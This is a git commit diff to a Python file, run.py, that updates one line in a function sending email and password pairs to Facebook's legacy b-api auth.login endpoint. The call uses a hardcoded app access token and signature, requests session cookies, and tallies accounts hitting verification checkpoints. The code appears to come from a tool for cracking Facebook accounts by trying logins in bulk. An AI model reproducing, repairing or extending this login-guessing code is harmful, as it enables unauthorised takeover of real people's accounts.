ad74283e6b3c86514b1be5c29948c30d5e9c18bf
Fanky <106883384+fanky86@users.noreply.github.com>
2025-03-12 00:43:05 +0700

    Update run.py

--- run.py
+++ run.py
@@ -1571,7 +1571,7 @@ def b_api(idf, pwv):
             # req = urllib.request.Request(url, headers=headers)
             # data = urllib.request.urlopen(req)
             # fannn = json.load(data)
-            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + idf + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + idf + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             fannn = json.load(data)
             if 'User must verify their account' in fannn['error_msg']:
                 cp += 1
